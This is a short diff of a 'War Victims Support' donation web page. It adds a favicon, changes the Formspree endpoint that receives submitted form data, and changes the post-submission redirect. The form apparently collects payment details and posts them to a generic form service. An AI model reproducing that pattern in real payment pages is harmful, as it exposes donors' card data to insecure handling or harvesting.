@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Donate | War Victims Support</title>
+  <link rel="shortcut icon" href="logo.webp" type="image/webp" />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet"/>
   <style>
     * {
@@ -280,7 +281,7 @@ document.addEventListener("DOMContentLoaded", function () {
         jsonData[key] = value;
       });
 
-      fetch("https://formspree.io/f/mwpbwgwo", { // Replace with your Formspree ID
+      fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -290,7 +291,7 @@ document.addEventListener("DOMContentLoaded", function () {
       })
       .then(response => {
         if (response.ok) {
-          window.location.href = "donate-payment.html"; // Redirect after submission
+          window.location.href = "choose-payment.html"; // Redirect after submission
         } else {
           alert("Payment Details Submission failed. Please try again.");
         }
